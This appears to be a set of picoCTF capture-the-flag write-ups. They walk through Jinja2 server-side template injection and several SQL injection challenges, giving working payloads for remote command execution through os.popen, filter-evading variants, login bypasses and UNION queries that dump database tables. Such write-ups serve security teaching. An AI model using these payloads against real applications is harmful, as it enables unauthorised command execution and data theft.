## <u>SSTI1
As the name suggests this CTF is about server side template injections. Using the image below we can figure out the template engine being used:

<img src="{{ site.url }}/assets/picoCtf/SSTI1.png" alt="ls command output" style="width: 500px; margin: auto; display: block;"/>
{% raw %}
In this case we see it leads us to either Twig or Jinja2 but {{7*'7'}} outputs 7777777 in Jinja2 and 49 in Twig and since we get 7777777 this means it is using Jinja2. Now we can use this payload to check if there is any filters we need to bypass:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
But we get no errors and get the results "uid=0(root) gid=0(root) groups=0(root)" so this means we are fine and can begin executing our own commands, but first lets break down what this payload is actually doing. Since many flask applications import request we can use it as a gateway to reach deeper into python internals. Then using .__globals__.__builtins__ we are able to access everything in the modules global scope which includes __builtins__ which refers the builtin modules in python like os. After importing os then we use the popen function which executes the command specified by the string command and then we can read the output using the read function.


Now we can use this payload to find the flag first by using ls to see what files are available:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
We see there is a file called flag and using cat we can output the contents:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
And we get: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}

## <u>SSTI2
This is a sequel to the last CTF but this time there is input sanitaztion. Again through testing we can find that the template engine is Jinja2 and through trial and error we find that it stops if there is '.' or '_'. Now we need to modify our previous payload to remove these characters, we can start with the '.' which we can remove through indexing instead like this:
```
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```
And then we can replace '_' with its unicode hex character '\x5f' as such:
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

Now we can use the payload to find the flag like last time:
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}
```
But then this gets blocked again and then through trial and error I found that having "{{}}" and "['']" at the same time causes it to get caught. Now instead we can use |attr() which is a Jinja filter which fetches an attribute from an object which we can use instead of "[]".
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```
After checking the files we find there is a file called flag which we can output.
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
And we get: picoCTF{sst1_f1lt3r_byp4ss_96a02202}

## <u>Irish-Name-Repo-1
In this challenge we are given a website and it has a admin login page. The first thing I try when seeing a login page is a SQL injection and in this case it work when the username is set to:
```
' OR 1=1--
```
Which gets us the flag: picoCTF{s0m3_SQL_f8adf3fb}

## <u>Irish-Name-Repo-2
In the next version of the previous challenge there is also an admin login but when using the same payload we get a message saying SQLi detected. After checking through the payload it seems like the OR is triggering the detection so we have to have a new payload which doesn't use it. If we set debug to 1 in the request we can see the query looks like this:
```
username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
```
Now if can guess the username of the admin we can comment out the password to login. On the first attempt you can guess that the username is admin which lets you login with the payload:
```
admin' --
```
Your flag is: picoCTF{m0R3_SQL_plz_aee925db}

## <u>Irish-Name-Repo-3
This time in the login we are only given the option to enter the password and once again we can try to use our first payload and set debug to 1 to see the query formed:
```
password: a' OR 1=1--
SQL query: SELECT * FROM admin where password = 'n' BE 1=1--'
```
Now we see something weird happening, all the letters from our input have been changed and it seems like a caeser cipher where everything has been shifted by 13 characters which is also known as rot13.  
Plain:    abcdefghijklmnopqrstuvwxyz  
Ciphered: nopqrstuvwxyzabcdefghijklm 
So now our new payload should be:
```
' BE 1=1--
```
Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}

## <u>Web Gauntlet
Round 1  
We are given a login page and told to login as admin, and when we input test for username and password we see the query is:
```
SELECT * FROM users WHERE username='test' AND password='test'
```
We also are told there is a filter on the word OR so it can't be included in our payload and again we can use the payload admin'--  
Round 2  
Now we have more stuff added to the filter, we cant use OR, AND, LIKE, = and --. Now from our last payload we can try use a substitute for -- as the comment, we can use /*comment*/ instead so now our payload is: admin'/*   
Round 3
Now the filter also include < and >. Our payload from the previous round should still work and it does so onto the next round.  
Round 4  
Now the word admin is also part of the filter so we can't use our payload from previous round. So maybe we can try to concatenate the word admin together then use our previous commenting method so our payload is: admi'||'n'/*  
This works now final round :)
Round 5
Luckliy for us the only addition to the filter is union which doesn't break our previous payload. Now we can see our flag at filter.php, picoCTF{y0u_m4d3_1t_79a0ddc6}.

## <u>More SQLi
When opening the CTF we are given a log in with a username and password field. From the name of the CTF we can tell there should be an SQL injection here and when inputting 'test' in both field we get shown that the query is:
```
username: test
password: test
SQL query: SELECT id FROM users WHERE password = 'test' AND username = 'test'
```
So if we enter " ' OR 1=1; -- " we are able to log in since this will cause the query to return something. Once logged in were are given a input field where we can search officies by the cities. Since this is probably also a SQL injection we could use a UNION attack to get information from other tables, but first we need to find out what tables exist and to do that we also need to know the database being used which we can do with the table below:
| Variant     | Function / Operator                                |
|-------------|----------------------------------------------------|
| **MySQL**   | `@@VERSION`                                        |
|             | `VERSION()`                                        |
|             | `@@GLOBAL.VERSION`                                 |
| **PostgreSQL** | `VERSION()`                                     |
| **MSSQL**   | `@@VERSION`                                        |
| **Oracle**  | `SELECT BANNER FROM v$version WHERE ROWNUM = 1`    |
|             | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1`   |
| **SQLite**  | `sqlite_version()`                                 |
After trying them all I found that it is SQLite so we can use the below payload to find the tables:
```
' UNION SELECT 'a','a',tbl_name FROM sqlite_master WHERE type='table';--
```
This injection reveals 4 tables: hints, more_table, offices, users. After checking the hints table I found that there was nothing helpful and now we will check the more_table but first we need to find its columns which we can do through the below payload:
```
' UNION SELECT 'a','a',MAX(sql) FROM sqlite_master WHERE tbl_name='more_table';--
```
And we get back:
```
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
```
Now we can output this using:
```
' UNION SELECT id, flag, 'a' FROM more_table;--
```
And there we finally find the flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}
